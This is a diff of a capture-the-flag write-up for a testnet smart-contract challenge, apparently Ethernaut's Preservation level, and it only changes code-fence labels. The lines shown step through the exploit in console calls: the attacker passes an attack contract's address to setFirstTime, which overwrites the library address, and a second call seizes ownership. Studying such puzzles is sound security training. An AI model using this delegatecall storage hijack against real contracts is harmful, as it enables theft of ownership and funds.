@@ -257,36 +257,36 @@ Let's hack the challenge!
 
 Firstly, check the owner of the contract and timeZone1Library's address.
 
-```solidity
+```js
 await contract.owner()
 '0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed'
 ```
 
-```solidity
+```js
 await contract.timeZone1Library()
 '0xf88ed7D1Dfcd1Bb89a975662fd7cB536058F3a30'
 ```
 
 After then, call the **setFirstTime()** function with our attack contract's address. See the transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xf9ebb1c25c237abaeec0ec801fd95a9d2ac3bd1c9a3d310eb2d14b64f916780d)
 
-```solidity
+```js
 await contract.setFirstTime("0xA970e836256FAa388Af589852039De9Dc8Ad6Fac")
 ```
 
 It has updated the timeZone1Library's address as attacker contract's address.
 
-```solidity
+```js
 await contract.timeZone1Library()
 '0xA970e836256FAa388Af589852039De9Dc8Ad6Fac'
 ```
 
 Again, call the setFirstTime() function and get the ownership of the contract. See the transaction in [etherscan.](https://sepolia.etherscan.io/tx/0xf399fafa9a83df0eb3670ad960635a28c95df0c95f49d21425578bf7ac2a8a43)
 
-```solidity
+```js
 await contract.setFirstTime("0xA970e836256FAa388Af589852039De9Dc8Ad6Fac")
 ```
 
-```solidity
+```js
 await contract.owner()
 '0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
 player
